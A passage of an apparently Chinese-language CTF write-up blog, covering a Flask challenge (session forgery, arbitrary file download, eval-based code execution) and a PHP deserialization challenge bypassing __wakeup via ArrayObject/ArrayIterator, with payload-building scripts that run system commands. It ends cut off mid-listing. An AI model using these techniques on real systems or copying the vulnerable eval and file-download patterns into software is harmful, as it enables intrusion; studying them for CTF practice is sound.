class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br></pre></td></tr></table></figure><p>那么我们就去进行seesion伪造试试</p><p><img src="../images/image-20230404165301393.png" alt="image-20230404165301393"></p><p>拿到session</p><p><img src="../images/image-20230404170039525.png" alt="image-20230404170039525"></p><p>session伪造成功了</p><p><img src="../images/image-20230404170123835.png" alt="image-20230404170123835"></p><p>然后登录管理员账户成功，接下来就是有个下载的接口</p><p><img src="../images/image-20230404170215806.png" alt="image-20230404170215806"></p><p>发现是个假的flag</p><p><img src="../images/image-20230404170320851.png" alt="image-20230404170320851"></p><p>发现他是这样下载文件的，，然后我们就可以尝试下载完整的源码进行查看</p><p><strong>app.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#x27;</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># Check if user is loggedin</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">            msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;show2.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;filename&#x27;</span> <span class="keyword">in</span> request.args:              </span><br><span class="line">            <span class="keyword">return</span> send_file(filename, as_attachment=<span class="literal">True</span>)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = request.args.get(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;hello,<span class="subst">&#123;<span class="built_in">eval</span>(s)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">   session.pop(<span class="string">&#x27;loggedin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;role&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后发现在hello路由那，发现有eval命令，然后就进行传值，eval为参数</p><p>然后源码里没有os库，那么我们就自己传一个os库进去</p><p><img src="../images/image-20230404170910299.png" alt="image-20230404170910299"></p><p>成功拿到flag</p><p>遇到这种给key的题，一般都是考seesion伪造或则是python的pickel反序列化</p><h2 id="暗网聊天室"><a href="#暗网聊天室" class="headerlink" title="暗网聊天室"></a>暗网聊天室</h2><p>题目</p><p><img src="../images/image-20230404173019155.png" alt="image-20230404173019155"></p><p><strong>公钥加密       私钥解密</strong></p><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p>题目</p><p><a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">别人的总结wp</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-24 10:16:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-25 00:25:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>漏洞影响版本：</strong></p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>修改属性值是这些版本才有用，这里的话是没有用的</p><p>考点：PHP7.3 __wakeup绕过，ArrayObject内置类</p><p>众所周知可以使用C进行绕过wakeup，但这样有一个缺点，就是你把O改为C后是没办法有属性的，那假如需要用属性命令执行就不行了QWQ</p><p>这种情况我们可以用内置类<strong>ArrayObject</strong>，这个内置类序列化结果如下</p><p><img src="../images/image-20230404175635385.png" alt="image-20230404175635385"></p><p>这个题目很明显就是要执行system方法，然后不可以以<code>O\a</code>打头，假如不ban掉a的话，我们可以在a数组里面放上我们的恶意对象，也可以反序列化，但是这里都去掉了，所以回到上面说的那个ArrayObject，他是C开头的，并且可以绕过O，然后还可以带属性反序列化，符合条件，因此可以构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshow;</span><br><span class="line"><span class="variable">$a</span>-&gt;ctfshow=<span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="comment">//unserialize($res)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.scuctf.com/ctfwiki/web/5.unserialize/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化a开头的使用</a></p><p><strong>查找脚本</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();<span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;unserialize&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        ))) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404181426665.png" alt="image-20230404181426665"></p><p>结果如下，注意到了还有ArrayIterator，实现了unserialize接口的大概率是C打头，因此在这几个类中寻找！</p><p>测试发现ArrayIterrator是可以的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-24 10:16:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-25 00:25:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshow;</span><br><span class="line"><span class="variable">$a</span>-&gt;ctfshow=<span class="string">&quot;cat /f*&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayIterator</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="comment">//unserialize($res)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404181631721.png" alt="image-20230404181631721"></p><p><strong>过所有测试发现可以用的类为：</strong></p><ul><li>ArrayObject::unserialize</li><li>ArrayIterator::unserialize</li><li>RecursiveArrayIterator::unserialize</li><li>SplObjectStorage::unserialize</li></ul><p>其中SplObjectStorage需要注意一下：</p><p><img src="../images/image-20230404181727382.png" alt="image-20230404181727382"></p><p>给加上一条就行</p><p>参考   ———&gt;    <a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">wp</a></p><h2 id="easy-class"><a href="#easy-class" class="headerlink" title="easy_class"></a>easy_class</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span 